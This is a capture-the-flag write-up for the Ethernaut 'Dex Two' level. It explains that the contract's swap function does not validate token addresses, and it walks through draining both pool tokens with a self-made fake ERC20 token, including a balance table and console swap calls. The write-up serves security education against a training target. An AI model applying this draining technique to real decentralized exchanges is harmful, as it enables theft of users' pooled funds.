[Level 23. Dex Two](https://ethernaut.openzeppelin.com/level/23)

## In A Nutshell

> Before swapping, checking `from` and `to` addresses is necessary.

## Concept

1. ERC20 Token Standard.
2. The necessary check for swap tokens.

## Level Target

1. Drain all balances of token1 and token2 from the `DexTwo` contract.

## Breakdown & Analysis

1. Different from [level 22. Dex](https://github.com/timou0911/Ethernaut-Writeup/tree/main/22.%20Dex%20%E2%98%85%E2%98%85%E2%98%86%E2%98%86%E2%98%86), the function `swap()` lacks the check of `from` and `to` addresses, which means we can swap token1 and token2 out with other tokens.
2. We create our own fake ERC20 token and swap them for token1 and token2.
3. Since we will be transferring our fake tokens to the DEX, it's important to ensure that the pool has sufficient balance beforehand.

|              | DEX - Token1 | DEX - Token2 | DEX - Fake | Player - Token1 | Player - Token2 | Player - Fake |
| ------------ |--------------|--------------|------------------|-----------------|-----------------|---------------------|
| Before Swap  |      100     |      100     |        100       |        10       |        10       |         300         |
| After Swapping Token 1 |      0      |      100      |        200        |        110        |        10       |        200       |
| After Swapping Token 2 |      0      |       0       |        400        |        110        |        110      |         0        |

## Detailed Steps

1. First we create our own fake ERC20 token with ourselves having a balance of at least 400.
2. We send 100 fake tokens to the target contract and approve the rest of the tokens to it.

```js
// after the above steps...
fakeToken = "0x...";
token1 = await contract.token1();
token2 = await contract.token2();

await contract.swap(fakeToken, token1, 100); // since the pool has 100 fake tokens, we send another 100 to the pool.
await contract.swap(fakeToken, token2, 200); // since the pool has 200 fake tokens, we send another 200 to the pool.
```
